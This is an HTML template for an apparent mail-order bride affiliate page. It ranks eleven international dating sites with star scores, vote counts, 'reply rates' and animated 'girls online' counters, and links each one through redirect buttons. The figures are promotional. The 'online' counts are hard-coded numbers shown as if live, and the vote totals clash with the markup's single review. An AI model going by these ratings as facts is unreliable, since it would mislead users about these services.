<!DOCTYPE html>
<html lang="en-US">
<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#
                  website: http://ogp.me/ns/website#">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    {{--<meta name="google-site-verification" content="1CaBkLHREoyLnTJawsUBSzT30tyjvB3SG2G66peQHwA"/>--}}
    <title>@yield('title')</title>
    <link rel="icon" href="/favicon_main.ico" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,500,600" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
    <link href="/css/beforestyles.css" rel="stylesheet">
    <link rel="stylesheet"  href="css/bright.css">

    {{--<meta property="og:title" content="Who is a Mail Order Bride? Find Beautiful Woman for Marriage"/>--}}
    {{--<meta property="og:url" content="https://yourbride.com/"/>--}}
    {{--<meta property="og:site_name" content="YourBride.com"/>--}}
    {{--<link rel="canonical" href="https://yourbride.com">--}}
    <meta property="og:description"
          content="@yield('og:description')"/>
    <meta name="description"
          content="@yield('description')">
    <meta name="keywords"
          content="@yield('keywords')">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script>
        $.fn.counting = function (opts) {
            let defaults = {
                from: 0,
                to: null,
                easing: 'swing',
                fade: true,
                complete: null
            };
            let options = $.extend(defaults, opts);

            function format(num) {
                num = num.toFixed();
                return num
            }

            return this.each(function () {
                let obj = $(this);
                let from = options.from;
                if (obj.attr('data-from')) {
                    from = parseFloat(obj.attr('data-from'));
                }
                let to = options.to;
                if (obj.attr('data-to')) {
                    to = parseFloat(obj.attr('data-to'));
                }
                let duration = options.duration;

                obj.css('counter', from);
                if (options.fade) obj.css('opacity', 0.7);
                obj.animate(
                    {
                        counter: to,
                        opacity: 1
                    },
                    {
                        easing: options.easing,
                        duration: duration,

                        step: function (progress) {
                            obj.html(format(progress * to));
                        },
                        complete: function () {
                            obj.css('counter', null);
                            obj.html(format(to));
                            if (options.complete) {
                                options.complete(obj)
                            }
                        }
                    }
                )
            })
        }
    </script>
</head>
<body>

<nav class="header sticky" id="topMenu">

    <div>
        <a class="hamburger hide_on_large"></a>
        <a class="cross hide_on_large" style="display: none;"></a>
        <a href="/">
            <div class="logo"></div>
        </a>

    </div>
    <div class="header_link hide_on_mobile">
        <a href="/">top 10 sites</a>
        <div class="drop">
            <a class="drop_menu">All Countries Mail Order Bride</a>
            <div class="dropdown_content">
                <a href="/russian-brides-sites/">Russian Brides Sites</a>
                <a href="/ukrainian-brides-sites/">Ukrainian Brides Sites</a>
                <a href="/asian-brides-sites/">Asian Brides Sites</a>
                <a href="/latin-brides-sites/">Latin Brides Sites</a>
            </div>
        </div>
        <a href="/success-stories/">Success Stories</a>
        <a href="/blog/">blog</a>
        <a href="/quizzes/">Quizzes</a>
    </div>
    <div class="header_link1" style="display: none;">
        <a href="/">top 10 sites</a>
        <a href="/russian-brides-sites/">Russian Brides Sites</a>
        <a href="/ukrainian-brides-sites/">Ukrainian Brides Sites</a>
        <a href="/asian-brides-sites/">Asian Brides Sites</a>
        <a href="/latin-brides-sites/">Latin Brides Sites</a>
        <a href="/success-stories/">Success Stories</a>
        <a href="/blog/">blog</a>
        <a href="/quizzes/">Quizzes</a>

    </div>

</nav>


<div class="header_image clearfixCust">
    <div id="main_title">
        <h1>@yield('h1')</h1>
    </div>
    <div id="main_title_text">@yield('main_title_text')<br></div>
    <div id="but_learn">
        <a href="#artiles_list_top" class="go_to">
            <span id="learnmore">
                Learn more
            </span>
        </a>
    </div>
    <form class="subscribe_form" method="post">
        <div class="row" style="margin-left: 0; margin-right: 0;">
            <div class="subscribe_image col s12 center">
                <div class="image_form"></div>
            </div>
            <div class="sbscr_text center">
            </div>
            <div class="inner_contact">
                <input id="email" type="email" class="input_cont" name="email" placeholder="Email"/>
            </div>
        </div>
        <input type="hidden" class="form_text" name="form_text" value="">
        <input type="hidden" class="form_position" name="form_position" value="desktop_top">
        <div class="error"></div>
        <div class="row" style="margin-left: 0; margin-right: 0;">
            <div class="col s12 center">
                <input type="submit" value="Subscribe" class="subscribe">
            </div>
        </div>
    </form>

</div>

<div class="articles_list" id="artiles_list_top" itemscope itemtype="http://schema.org/Table">
    <div id="top_mail_order_brides_sites"></div>
    <div class="top_rating_item clearfixCust" itemscope itemtype="http://schema.org/Product">
        <div class="product_image_col">
            <div class="top_choice"></div>
            <div class="image_article">
                <a href="/victoria-brides/">
                    <img src="/images/1534172706298-victoria-brides_s.jpg" alt="Victoria Brides" title="Victoria Brides" id="image_single_article"
                         itemprop="logo">
                </a>
            </div>
            <div class="main_stars">
                <div class="star_rate small_stars" itemprop="aggregateRating" itemscope=""
                     itemtype="http://schema.org/AggregateRating">
                    <div style="display: none" itemprop="reviewCount">1</div>
                    <div style="display: none" itemprop="bestRating">10</div>
                    <div id="total_score" itemprop="ratingValue">9.8 </div>
                    <div class="stars"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class = "glyphicon glyphicon-star half"></span></div>
                </div>
                <div class="votes small_votes">
                    (5748 votes)
                </div>
            </div>
            <a href="/go/victoria-brides?page=main" target="_blank" class="v_btn hide_on_large" rel="nofollow">
                Visit Site
            </a>


        </div>


        <div class="column_buttons">
            <a href="/go/victoria-brides?page=main" target="_blank" class="v_btn hide_on_mobile" rel="nofollow" style="display: block;">
                Visit Site
            </a>

            <div class="read_review_btn hide_on_mobile"><a href="/victoria-brides/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>


        <div class="column_content">
            <div class="cell_title">1. <span itemprop="name">Victoria Hearts</span></div>
            <div class="cell_content"><ul>
                    <li>There are thousands of Ukrainian, Russian, Georgian, Moldovan and Latvian girls’ accounts on Victoria Hearts</li>
                    <li>The site can be accessed from various devices</li>
                    <li>Ladies can be selected by their photo and appearance preferences like on Tinder</li>
                    <li>Various services for interacting with women available: instant messaging, video calls, gifts and flowers delivery</li>
                </ul>
            </div>
            <div class="rates row" style="margin-left: 0;">
                <div class="green_number">97%
                    <div class="number_text"> Girl's reply rate</div>
                </div>
                <div class="green_number green_2"><span class="counter" data-from="0"
                                                        data-to="7266"></span>
                    <div class="number_text"> Girl's online</div>
                </div>
            </div>
            <div class="read_review_btn hide_on_large"><a href="/victoria-brides/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>
    </div>
    <div class="line clearfixCust" id="line_article"></div>

    <div class="top_rating_item clearfixCust" itemscope itemtype="http://schema.org/Product">
        <div class="product_image_col">

            <div class="image_article">
                <a href="/asia-charm-review/">
                    <img src="/images/1534173069589-asia-charm-review_s.jpeg" alt=" Asia Charm Reviews" title=" Asia Charm Reviews" id="image_single_article"
                         itemprop="logo">
                </a>
            </div>
            <div class="main_stars">
                <div class="star_rate small_stars" itemprop="aggregateRating" itemscope=""
                     itemtype="http://schema.org/AggregateRating">
                    <div style="display: none" itemprop="reviewCount">1</div>
                    <div style="display: none" itemprop="bestRating">10</div>
                    <div id="total_score" itemprop="ratingValue">9.6 </div>
                    <div class="stars"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class = "glyphicon glyphicon-star half"></span></div>
                </div>
                <div class="votes small_votes">
                    (4836 votes)
                </div>
            </div>
            <a href="/go/asia-charm-review?page=main" target="_blank" class="v_btn hide_on_large" rel="nofollow">
                Visit Site
            </a>


        </div>


        <div class="column_buttons">
            <a href="/go/asia-charm-review?page=main" target="_blank" class="v_btn hide_on_mobile" rel="nofollow" style="display: block;">
                Visit Site
            </a>

            <div class="read_review_btn hide_on_mobile"><a href="/asia-charm-review/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>


        <div class="column_content">
            <div class="cell_title">2. <span itemprop="name">Asia Charm</span></div>
            <div class="cell_content"><ul><li>      Every month Asia Charm is visited by more than 55,000 people from different countries</li><li>The database of Asian beauties is extended</li><li> Advanced search permits selection by 3 main criteria: location, lifestyle, appearance</li><li> Data algorithms find best matches depending on info in the profile</li> </ul></div>
            <div class="rates row" style="margin-left: 0;">
                <div class="green_number">95%
                    <div class="number_text"> Girl's reply rate</div>
                </div>
                <div class="green_number green_2"><span class="counter" data-from="0"
                                                        data-to="6330"></span>
                    <div class="number_text"> Girl's online</div>
                </div>
            </div>
            <div class="read_review_btn hide_on_large"><a href="/asia-charm-review/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>
    </div>
    <div class="line clearfixCust" id="line_article"></div>

    <div class="top_rating_item clearfixCust" itemscope itemtype="http://schema.org/Product">
        <div class="product_image_col">

            <div class="image_article">
                <a href="/matchtruly-review/">
                    <img src="/images/1534173868449-matchtruly-review_s.jpeg" alt="" title="" id="image_single_article"
                         itemprop="logo">
                </a>
            </div>
            <div class="main_stars">
                <div class="star_rate small_stars" itemprop="aggregateRating" itemscope=""
                     itemtype="http://schema.org/AggregateRating">
                    <div style="display: none" itemprop="reviewCount">1</div>
                    <div style="display: none" itemprop="bestRating">10</div>
                    <div id="total_score" itemprop="ratingValue">9.6 </div>
                    <div class="stars"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class = "glyphicon glyphicon-star half"></span></div>
                </div>
                <div class="votes small_votes">
                    (4967 votes)
                </div>
            </div>
            <a href="/go/matchtruly-review?page=main" target="_blank" class="v_btn hide_on_large" rel="nofollow">
                Visit Site
            </a>


        </div>


        <div class="column_buttons">
            <a href="/go/matchtruly-review?page=main" target="_blank" class="v_btn hide_on_mobile" rel="nofollow" style="display: block;">
                Visit Site
            </a>

            <div class="read_review_btn hide_on_mobile"><a href="/matchtruly-review/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>


        <div class="column_content">
            <div class="cell_title">3. <span itemprop="name">Matchtruly</span></div>
            <div class="cell_content"><ul><li>A myriad of single women’s profiles</li><li>High-class safety standards and explicit security guidelines</li><li>Top-notch tools for efficient communication with women</li><li>Detailed descriptions in profiles that provide essential information about single users</li><li>Friendly and open-minded atmosphere</li></ul></div>
            <div class="rates row" style="margin-left: 0;">
                <div class="green_number">90%
                    <div class="number_text"> Girl's reply rate</div>
                </div>
                <div class="green_number green_2"><span class="counter" data-from="0"
                                                        data-to="4667"></span>
                    <div class="number_text"> Girl's online</div>
                </div>
            </div>
            <div class="read_review_btn hide_on_large"><a href="/matchtruly-review/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>
    </div>
    <div class="line clearfixCust" id="line_article"></div>
    <div class="subscribe_form_articles_div hide_on_mobile" style="width: 100%">
        <form class="subscribe_form_articles" method="post">
            <div class="row" style="margin-left: 0; margin-right: 0;">
                <div class="form_articles col s7" style="display: block; margin: auto; float: none;">

                    <div class="col s4 left">
                        <div class="image_form_articles"></div>
                    </div>
                    <div class="form_content_tablet col s7 left">

                        <div class="sbscr_text sbscr_text_articles col s9 left">

                        </div>
                        <div class="col s1 left">
                            <div class="close_form"></div>
                        </div>

                        <div class="inner_contact_articles col s5 left">
                            <input id="email" type="email" class="input_cont" name="email" placeholder="Email"/>
                        </div>
                        <input type="hidden" class="form_text" name="form_text" value="">
                        <input type="hidden" class="form_position" name="form_position" value="desktop_tablet_articles">

                        <div class="subscribe_tablet col s4 left">
                            <input type="submit" value="Subscribe" class="subscribe subscribe_article">
                        </div>
                        <div class="error col s12"></div>
                    </div>
                </div>
            </div>


        </form>
        <div class="line clearfixCust" id="line_article"></div>

    </div>

    <form class="hide_on_large" style="background-color: #ffffff;" method="post">
        <div class="row" style="margin-left: 0; margin-right: 0;">
            <div class="mobile_close_form"></div>
            <div class="subscribe_image col s12 center">
                <div class="image_form"></div>
            </div>
            <div class="sbscr_text center">
            </div>
            <div class="inner_contact center">
                <input id="email" type="email" class="input_cont" name="email" placeholder="Email"/>
            </div>
        </div>
        <input type="hidden" class="form_text" name="form_text" value="">
        <input type="hidden" class="form_position" name="form_position" value="mobile_footer">
        <div class="error"></div>
        <div class="row" style="margin-left: 0; margin-right: 0;">
            <div class="col s12 center">
                <input type="submit" value="Subscribe" class="subscribe">
            </div>
        </div>
    </form>
    <div class="line clearfixCust" id="line_article"></div>



    <div class="top_rating_item clearfixCust" itemscope itemtype="http://schema.org/Product">
        <div class="product_image_col">

            <div class="image_article">
                <a href="/chnlove/">
                    <img src="/images/1534172729245-chnlove_s.jpg" alt="ChnLove Reviews" title="ChnLove Reviews" id="image_single_article"
                         itemprop="logo">
                </a>
            </div>
            <div class="main_stars">
                <div class="star_rate small_stars" itemprop="aggregateRating" itemscope=""
                     itemtype="http://schema.org/AggregateRating">
                    <div style="display: none" itemprop="reviewCount">1</div>
                    <div style="display: none" itemprop="bestRating">10</div>
                    <div id="total_score" itemprop="ratingValue">9.5 </div>
                    <div class="stars"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class = "glyphicon glyphicon-star half"></span></div>
                </div>
                <div class="votes small_votes">
                    (4763 votes)
                </div>
            </div>
            <a href="/go/chnlove?page=main" target="_blank" class="v_btn hide_on_large" rel="nofollow">
                Visit Site
            </a>


        </div>


        <div class="column_buttons">
            <a href="/go/chnlove?page=main" target="_blank" class="v_btn hide_on_mobile" rel="nofollow" style="display: block;">
                Visit Site
            </a>

            <div class="read_review_btn hide_on_mobile"><a href="/chnlove/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>


        <div class="column_content">
            <div class="cell_title">4. <span itemprop="name">ChnLove</span></div>
            <div class="cell_content"><ul>
                    <li>70,000 people from all over the world visit <strong>ChnLove</strong> monthly</li>
                    <li>18,000 active members on the site</li>
                    <li>A minimum of 2,000 users are always online and ready for communication</li>
                    <li>The team is professional with 20 years of experience in the niche</li>
                    <li>Mobile app for Android users </li>
                </ul></div>
            <div class="rates row" style="margin-left: 0;">
                <div class="green_number">89%
                    <div class="number_text"> Girl's reply rate</div>
                </div>
                <div class="green_number green_2"><span class="counter" data-from="0"
                                                        data-to="5411"></span>
                    <div class="number_text"> Girl's online</div>
                </div>
            </div>
            <div class="read_review_btn hide_on_large"><a href="/chnlove/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>
    </div>
    <div class="line clearfixCust" id="line_article"></div>

    <div class="top_rating_item clearfixCust" itemscope itemtype="http://schema.org/Product">
        <div class="product_image_col">

            <div class="image_article">
                <a href="/loveswans-review/">
                    <img src="/images/1534172856312-loveswans-review_s.jpg" alt="LoveSwans Reviews" title="LoveSwans Reviews" id="image_single_article"
                         itemprop="logo">
                </a>
            </div>
            <div class="main_stars">
                <div class="star_rate small_stars" itemprop="aggregateRating" itemscope=""
                     itemtype="http://schema.org/AggregateRating">
                    <div style="display: none" itemprop="reviewCount">1</div>
                    <div style="display: none" itemprop="bestRating">10</div>
                    <div id="total_score" itemprop="ratingValue">9.5 </div>
                    <div class="stars"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class = "glyphicon glyphicon-star half"></span></div>
                </div>
                <div class="votes small_votes">
                    (3114 votes)
                </div>
            </div>
            <a href="/go/loveswans-review?page=main" target="_blank" class="v_btn hide_on_large" rel="nofollow">
                Visit Site
            </a>


        </div>


        <div class="column_buttons">
            <a href="/go/loveswans-review?page=main" target="_blank" class="v_btn hide_on_mobile" rel="nofollow" style="display: block;">
                Visit Site
            </a>

            <div class="read_review_btn hide_on_mobile"><a href="/loveswans-review/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>


        <div class="column_content">
            <div class="cell_title">5. <span itemprop="name">LoveSwans</span></div>
            <div class="cell_content"><ul>
                    <li> <strong>LoveSwans</strong> offers numerous accounts of Slavic women but have no limits for female members of other nationalities</li>
                    <li>  Express Mail Forwarding option makes sure the girl receives a translated into her mother tongue letter</li>
                    <li> Services like webcam chatting, flowers and gifts delivery are available</li>
                    <li> LoveSwans specifically designed app</li>
                </ul></div>
            <div class="rates row" style="margin-left: 0;">
                <div class="green_number">92%
                    <div class="number_text"> Girl's reply rate</div>
                </div>
                <div class="green_number green_2"><span class="counter" data-from="0"
                                                        data-to="4611"></span>
                    <div class="number_text"> Girl's online</div>
                </div>
            </div>
            <div class="read_review_btn hide_on_large"><a href="/loveswans-review/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>
    </div>
    <div class="line clearfixCust" id="line_article"></div>

    <div class="top_rating_item clearfixCust" itemscope itemtype="http://schema.org/Product">
        <div class="product_image_col">

            <div class="image_article">
                <a href="/romancetale/">
                    <img src="/images/1534172755154-romancetale_s.jpeg" alt="RomanceTale" title="RomanceTale" id="image_single_article"
                         itemprop="logo">
                </a>
            </div>
            <div class="main_stars">
                <div class="star_rate small_stars" itemprop="aggregateRating" itemscope=""
                     itemtype="http://schema.org/AggregateRating">
                    <div style="display: none" itemprop="reviewCount">1</div>
                    <div style="display: none" itemprop="bestRating">10</div>
                    <div id="total_score" itemprop="ratingValue">9.3 </div>
                    <div class="stars"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class = "glyphicon glyphicon-star half"></span></div>
                </div>
                <div class="votes small_votes">
                    (3884 votes)
                </div>
            </div>
            <a href="/go/romancetale?page=main" target="_blank" class="v_btn hide_on_large" rel="nofollow">
                Visit Site
            </a>


        </div>


        <div class="column_buttons">
            <a href="/go/romancetale?page=main" target="_blank" class="v_btn hide_on_mobile" rel="nofollow" style="display: block;">
                Visit Site
            </a>

            <div class="read_review_btn hide_on_mobile"><a href="/romancetale/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>


        <div class="column_content">
            <div class="cell_title">6. <span itemprop="name">RomanceTale</span></div>
            <div class="cell_content"><ul>
                    <li>Over 10,000 single members looking for cross-culture relationships on <strong>RomanceTale</strong></li>
                    <li>Every month the site is visited by more than 180,000 people from all over the globe</li>
                    <li>Face-to-face dates arrangement available</li>
                    <li>RomanceTale offers services of interpreters</li>
                    <li>Advanced anti-scam policy and guarantees of chatting with real people only</li>
                </ul>
            </div>
            <div class="rates row" style="margin-left: 0;">
                <div class="green_number">93%
                    <div class="number_text"> Girl's reply rate</div>
                </div>
                <div class="green_number green_2"><span class="counter" data-from="0"
                                                        data-to="5703"></span>
                    <div class="number_text"> Girl's online</div>
                </div>
            </div>
            <div class="read_review_btn hide_on_large"><a href="/romancetale/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>
    </div>
    <div class="line clearfixCust" id="line_article"></div>

    <div class="top_rating_item clearfixCust" itemscope itemtype="http://schema.org/Product">
        <div class="product_image_col">

            <div class="image_article">
                <a href="/rubrides/">
                    <img src="/images/1534174504993-rubrides_s.jpg" alt="" title="" id="image_single_article"
                         itemprop="logo">
                </a>
            </div>
            <div class="main_stars">
                <div class="star_rate small_stars" itemprop="aggregateRating" itemscope=""
                     itemtype="http://schema.org/AggregateRating">
                    <div style="display: none" itemprop="reviewCount">1</div>
                    <div style="display: none" itemprop="bestRating">10</div>
                    <div id="total_score" itemprop="ratingValue">9.3 </div>
                    <div class="stars"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class = "glyphicon glyphicon-star half"></span></div>
                </div>
                <div class="votes small_votes">
                    (3472 votes)
                </div>
            </div>
            <a href="/go/rubrides?page=main" target="_blank" class="v_btn hide_on_large" rel="nofollow">
                Visit Site
            </a>


        </div>


        <div class="column_buttons">
            <a href="/go/rubrides?page=main" target="_blank" class="v_btn hide_on_mobile" rel="nofollow" style="display: block;">
                Visit Site
            </a>

            <div class="read_review_btn hide_on_mobile"><a href="/rubrides/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>


        <div class="column_content">
            <div class="cell_title">7. <span itemprop="name">Rubrides</span></div>
            <div class="cell_content"><ul>
                    <li>
                        Registration is free
                    </li>
                    <li>
                        Numerous Russian girls’ accounts available
                    </li>
                    <li>
                        The payment system is transparent, and you pay only for services that you use
                    </li>
                    <li>
                        High safety level
                    </li>
                </ul></div>
            <div class="rates row" style="margin-left: 0;">
                <div class="green_number">83%
                    <div class="number_text"> Girl's reply rate</div>
                </div>
                <div class="green_number green_2"><span class="counter" data-from="0"
                                                        data-to="5466"></span>
                    <div class="number_text"> Girl's online</div>
                </div>
            </div>
            <div class="read_review_btn hide_on_large"><a href="/rubrides/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>
    </div>
    <div class="line clearfixCust" id="line_article"></div>

    <div class="top_rating_item clearfixCust" itemscope itemtype="http://schema.org/Product">
        <div class="product_image_col">

            <div class="image_article">
                <a href="/kissrussianbeauty-review/">
                    <img src="/images/1534173801422-kissrussianbeauty-review_s.jpg" alt="" title="" id="image_single_article"
                         itemprop="logo">
                </a>
            </div>
            <div class="main_stars">
                <div class="star_rate small_stars" itemprop="aggregateRating" itemscope=""
                     itemtype="http://schema.org/AggregateRating">
                    <div style="display: none" itemprop="reviewCount">1</div>
                    <div style="display: none" itemprop="bestRating">10</div>
                    <div id="total_score" itemprop="ratingValue">9.3 </div>
                    <div class="stars"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class = "glyphicon glyphicon-star half"></span></div>
                </div>
                <div class="votes small_votes">
                    (4342 votes)
                </div>
            </div>
            <a href="/go/kissrussianbeauty-review?page=main" target="_blank" class="v_btn hide_on_large" rel="nofollow">
                Visit Site
            </a>


        </div>


        <div class="column_buttons">
            <a href="/go/kissrussianbeauty-review?page=main" target="_blank" class="v_btn hide_on_mobile" rel="nofollow" style="display: block;">
                Visit Site
            </a>

            <div class="read_review_btn hide_on_mobile"><a href="/kissrussianbeauty-review/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>


        <div class="column_content">
            <div class="cell_title">8. <span itemprop="name">KissRussianBeauty</span></div>
            <div class="cell_content"><ul>
                    <li>KissRussianBeauty is focused on Slavic countries such as Russia, Ukraine, or Belarus</li><li>Various communication methods (live chat, video calls, direct messages, etc.)</li>
                    <li>"Find your match" option available all members free of charge</li>
                </ul></div>
            <div class="rates row" style="margin-left: 0;">
                <div class="green_number">93%
                    <div class="number_text"> Girl's reply rate</div>
                </div>
                <div class="green_number green_2"><span class="counter" data-from="0"
                                                        data-to="6290"></span>
                    <div class="number_text"> Girl's online</div>
                </div>
            </div>
            <div class="read_review_btn hide_on_large"><a href="/kissrussianbeauty-review/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>
    </div>
    <div class="line clearfixCust" id="line_article"></div>

    <div class="top_rating_item clearfixCust" itemscope itemtype="http://schema.org/Product">
        <div class="product_image_col">

            <div class="image_article">
                <a href="/bridge-of-love/">
                    <img src="/images/1534172783794-bridge-of-love_s.jpg" alt="Bridge Of Love Reviews" title="Bridge Of Love Reviews" id="image_single_article"
                         itemprop="logo">
                </a>
            </div>
            <div class="main_stars">
                <div class="star_rate small_stars" itemprop="aggregateRating" itemscope=""
                     itemtype="http://schema.org/AggregateRating">
                    <div style="display: none" itemprop="reviewCount">1</div>
                    <div style="display: none" itemprop="bestRating">10</div>
                    <div id="total_score" itemprop="ratingValue">8.3 </div>
                    <div class="stars"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star-empty"></span></div>
                </div>
                <div class="votes small_votes">
                    (1532 votes)
                </div>
            </div>
            <a href="/go/bridge-of-love?page=main" target="_blank" class="v_btn hide_on_large" rel="nofollow">
                Visit Site
            </a>


        </div>


        <div class="column_buttons">
            <a href="/go/bridge-of-love?page=main" target="_blank" class="v_btn hide_on_mobile" rel="nofollow" style="display: block;">
                Visit Site
            </a>

            <div class="read_review_btn hide_on_mobile"><a href="/bridge-of-love/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>


        <div class="column_content">
            <div class="cell_title">9. <span itemprop="name">Bridge Of Love</span></div>
            <div class="cell_content"><ul><li>The site can boast with over 100,000 members</li><li>Offline meetings can be arranged according to man’s preferences</li><li>Services of interpreter</li><li>Women registered based on a multiple-factors questionnaire like age, hair color and eye color, attitude towards children, etc.</li><li>Only real girls’ photos</li></ul></div>
            <div class="rates row" style="margin-left: 0;">
                <div class="green_number">81%
                    <div class="number_text"> Girl's reply rate</div>
                </div>
                <div class="green_number green_2"><span class="counter" data-from="0"
                                                        data-to="2382"></span>
                    <div class="number_text"> Girl's online</div>
                </div>
            </div>
            <div class="read_review_btn hide_on_large"><a href="/bridge-of-love/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>
    </div>
    <div class="line clearfixCust" id="line_article"></div>

    <div class="top_rating_item clearfixCust" itemscope itemtype="http://schema.org/Product">
        <div class="product_image_col">

            <div class="image_article">
                <a href="/dream-marriage/">
                    <img src="/images/1534172808402-dream-marriage_s.jpg" alt="Dream Marriage Reviews" title="Dream Marriage Reviews" id="image_single_article"
                         itemprop="logo">
                </a>
            </div>
            <div class="main_stars">
                <div class="star_rate small_stars" itemprop="aggregateRating" itemscope=""
                     itemtype="http://schema.org/AggregateRating">
                    <div style="display: none" itemprop="reviewCount">1</div>
                    <div style="display: none" itemprop="bestRating">10</div>
                    <div id="total_score" itemprop="ratingValue">8.0 </div>
                    <div class="stars"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star-empty"></span></div>
                </div>
                <div class="votes small_votes">
                    (1583 votes)
                </div>
            </div>
            <a href="/go/dream-marriage?page=main" target="_blank" class="v_btn hide_on_large" rel="nofollow">
                Visit Site
            </a>


        </div>


        <div class="column_buttons">
            <a href="/go/dream-marriage?page=main" target="_blank" class="v_btn hide_on_mobile" rel="nofollow" style="display: block;">
                Visit Site
            </a>

            <div class="read_review_btn hide_on_mobile"><a href="/dream-marriage/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>


        <div class="column_content">
            <div class="cell_title">10. <span itemprop="name">Dream Marriage</span></div>
            <div class="cell_content"><ul>
                    <li>Every month Dream Marriage is visited by more than 50,000 people</li>
                    <li>The team has 10 years of experience in the online dating market</li>
                    <li>Only 5 minutes needed to create a profile</li>
                    <li>4 membership packages available</li>
                    <li>All the ladies go through verification interviews before been registered</li>
                </ul>
            </div>
            <div class="rates row" style="margin-left: 0;">
                <div class="green_number">73%
                    <div class="number_text"> Girl's reply rate</div>
                </div>
                <div class="green_number green_2"><span class="counter" data-from="0"
                                                        data-to="2219"></span>
                    <div class="number_text"> Girl's online</div>
                </div>
            </div>
            <div class="read_review_btn hide_on_large"><a href="/dream-marriage/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>
    </div>
    <div class="line clearfixCust" id="line_article"></div>

    <div class="top_rating_item clearfixCust" itemscope itemtype="http://schema.org/Product">
        <div class="product_image_col">

            <div class="image_article">
                <a href="/idate-asia/">
                    <img src="/images/1534172830759-idate-asia_s.jpg" alt="I Date Asia Reviews" title="I Date Asia Reviews" id="image_single_article"
                         itemprop="logo">
                </a>
            </div>
            <div class="main_stars">
                <div class="star_rate small_stars" itemprop="aggregateRating" itemscope=""
                     itemtype="http://schema.org/AggregateRating">
                    <div style="display: none" itemprop="reviewCount">1</div>
                    <div style="display: none" itemprop="bestRating">10</div>
                    <div id="total_score" itemprop="ratingValue">7.8 </div>
                    <div class="stars"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star-empty"></span><span class="glyphicon glyphicon-star-empty"></span></div>
                </div>
                <div class="votes small_votes">
                    (1048 votes)
                </div>
            </div>
            <a href="/go/idate-asia?page=main" target="_blank" class="v_btn hide_on_large" rel="nofollow">
                Visit Site
            </a>


        </div>


        <div class="column_buttons">
            <a href="/go/idate-asia?page=main" target="_blank" class="v_btn hide_on_mobile" rel="nofollow" style="display: block;">
                Visit Site
            </a>

            <div class="read_review_btn hide_on_mobile"><a href="/idate-asia/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>


        <div class="column_content">
            <div class="cell_title">11. <span itemprop="name"> I Date Asia</span></div>
            <div class="cell_content"><ul><li>Thousands of members from Thailand, Vietnam, the Philippines, and China</li><li>There are over 130,000 monthly visitors on I Date Asia</li><li>Free translation services to avoid language barriers</li><li>Strict anti-scam policy, according to which girls’ identities verified</li><li>Considerable discounts available for newcomers</li></ul></div>
